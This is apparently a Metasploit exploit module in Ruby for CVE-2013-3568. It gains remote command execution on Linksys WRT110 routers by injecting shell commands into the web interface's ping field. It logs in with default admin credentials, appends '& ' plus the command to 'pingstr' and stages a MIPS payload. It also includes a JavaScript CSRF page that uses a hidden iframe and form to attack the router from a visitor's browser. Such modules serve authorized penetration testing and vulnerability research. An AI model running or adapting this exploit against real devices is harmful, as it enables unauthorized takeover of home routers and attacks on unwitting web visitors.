##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient # for contacting the host
  include Msf::Exploit::CmdStagerEcho
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linksys WRT110 Remote Command Execution',
      'Description' => %q{
        The Linksys WRT110 consumer router is vulnerable to a command injection
        exploit in the ping field of the web interface.

        By enabling the SERVE_CSRF datastore option, direct exploitation is no
        longer attempted. Instead, a web server is initialized that serves a
        page containing javascript that attempts to exploit the router from
        the client's browser.
      },
      'Author'      =>
        [
          'Craig Young', # Vulnerability discovery
          'joev <jvennix[at]rapid7.com>', # msf module
          'juan vazquez' # module help + echo cmd stager
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2013-3568'],
          ['BID', '61151'],
          ['URL', 'http://seclists.org/bugtraq/2013/Jul/78']
        ],
      'DisclosureDate' => 'Jul 12 2013',
      'Privileged'     => true,
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSLE,
      'Targets'        =>
        [
            ['Linux mipsel Payload', { } ]
        ],
      'DefaultTarget'  => 0,
      ))

    register_options([
      OptString.new('USERNAME', [ true, 'Valid router administrator username', 'admin']),
      OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
      OptAddress.new('RHOST', [true, 'The address of the router', '192.168.1.1']),
      OptInt.new('TIMEOUT', [false, 'The timeout to use in every request', 20]),
      OptBool.new('SERVE_CSRF', [false, 'Run an HTTP server to serve a webpage that exploits a user via CSRF', false])
    ], self.class)

  end

  def check
    begin
      res = send_request_cgi({
        'uri' => '/HNAP1/'
      })
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Safe
    end

    if res and res.code == 200 and res.body =~ /<ModelName>WRT110<\/ModelName>/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    if datastore['SERVE_CSRF']
      print_status "Initializing HTTP server to serve malicious web page."
      super # starts the HTTP server
    else
      test_login!
      execute_cmdstager
    end
  end

  # For serving the javascript CSRF exploit
  def on_request_uri(cli, request)
    send_response(cli, js_csrf_exploit, { 'Content-Type' => 'text/html' })
  end

  def js_csrf_exploit
    %Q|
    <html><body><script>
      var create_frame = function() {
        var f = document.createElement('iframe');
        f.setAttribute('style', 'position: fixed; top: -500px; left: -500px; width: 1px; height: 1px;');
        return f;
      }

      var check = function(root, callback) {
        var f = create_frame();
        document.body.appendChild(f);
        var s = f.contentDocument.createElement('script');
        var err = function() { callback("Request timed out or auth unsuccessful."); };
        s.onload = function() {
          if (f.contentDocument.blah) {
            callback(null);
          } else {
            callback("Host contacted but is not a vulnerable WRT110.");
          }
        }
        s.onerror = err;
        window.setTimeout(err, 8000);
        s.src = root+'/script.js';
        f.contentDocument.body.appendChild(s);
      };

      var exploit = function(root, frame) {
        // send the exploit request
        //var x = new XMLHttpRequest;
        //x.open('POST', root+'/ping.cgi', false);
        //x.send('vars_post[pingstr]='+);

        var form = document.createElement('form');
        form.action = root+'/ping.cgi';
        form.method = 'POST';
        form.target = frame.name;
        var input = document.createElement('input');
        input.name = 'vars_post[pingstr]';
        input.value = 'WEEEPAYLOAD';
        form.submit()
      }

      var tryexploit = function(ip, user, pass) {
        var frame = create_frame();
        var seed = parseInt(Math.random() * 9999999);
        frame.name = 'frame'+seed;
        user = user \|\| '';
        pass = pass \|\| '';
        var user_or_pass = ((user && user.length > 0) \|\| (pass && pass.length > 0));

        var root = 'http://';
        if (user_or_pass) {
          root += user+':'+pass+'@';
          //return exploit(root+user+':'+pass+'@'+ip, frame);
        }
        root += ip;

        check(root, function(error) {
          if (error) {
            if (user_or_pass) {
              console.log("Error ("+user+":"+pass+"): "+error);
            } else {
              console.log("Error: "+error);
            }
            return;
          }
          exploit(root, frame);
        });
      };

      var ip = '#{datastore['RHOST']}';
      // try both user-already-logged-in and provided creds
      tryexploit(ip);
      tryexploit(ip, '#{user}', '#{pass}');
    </script></body></html>
    |
  end

  # Sends an HTTP request with authorization header to the router
  # Raises an exception unless the login is successful
  def test_login!
    print_status("#{rhost}:#{rport} - Trying to login with #{user}:#{pass}")

    res = send_auth_request_cgi({
      'uri' => '/',
      'method' => 'GET'
    })

    if not res or res.code == 401 or res.code == 404
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - Could not login with #{user}:#{pass}")
    else
      print_good("#{rhost}:#{rport} - Successful login #{user}:#{pass}")
    end
  end

  # Run the command on the router
  def execute_command(cmd, opts)
    send_auth_request_cgi({
      'uri' => '/ping.cgi',
      'method' => 'POST',
      'vars_post' => {
         'pingstr' => '& ' + cmd
      }
    })

    Rex.sleep(1) # Give the device a second
  end

  # Helper methods
  def user; datastore['USERNAME']; end
  def pass; datastore['PASSWORD'] || ''; end

  def send_auth_request_cgi(opts={}, timeout=nil)
    timeout ||= datastore['TIMEOUT']
    opts.merge!('authorization' => basic_auth(user, pass))
    begin
      send_request_cgi(opts, timeout)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end
end
